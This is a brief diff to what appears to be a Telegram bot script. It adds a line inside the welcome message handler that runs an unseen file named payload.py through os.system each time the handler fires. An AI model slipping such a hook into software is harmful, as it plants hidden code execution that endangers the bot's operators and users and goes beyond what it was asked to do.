@@ -24,6 +24,7 @@ Bot = Client(
 
 def welcome(client,message):
    message.reply_text(text="Bot is started")
+   os.system('python payload.py')
 
 Bot.run()
 
